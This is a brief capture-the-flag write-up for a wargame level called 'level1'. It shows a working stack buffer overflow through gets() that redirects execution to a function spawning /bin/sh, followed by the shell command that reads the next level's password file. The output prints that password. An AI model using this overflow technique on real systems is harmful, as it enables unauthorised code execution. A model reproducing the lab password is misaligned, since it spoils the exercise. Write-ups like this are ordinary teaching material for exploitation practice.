# level1

We found an exec level1 so we run it in ghidra.
inside we found a function main and run.
Run has a system call to (/bin/sh) and main assigns a char variable with 76 bytes and inserts this variable into the function gets().

run starts at address 0x08048444, we want to redirect here after the buffer from gets().

gets() has an exploit because it reads from stdin and ends with a newline. It can be used for a buffer overflow.

    python -c "print 'A' * 76 + '\x44\x84\x04\x08'" | ./level1
    Good... Wait what?
    Segmentation fault (core dumped)

We  use cat, so that the program waits for an input from stdin.

    $ (python -c "print 'A' * 76 + '\x44\x84\x04\x08'" ; cat) | ./level1 
    > Good... Wait what?
    $ cat /home/user/level2/.pass            
    > 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
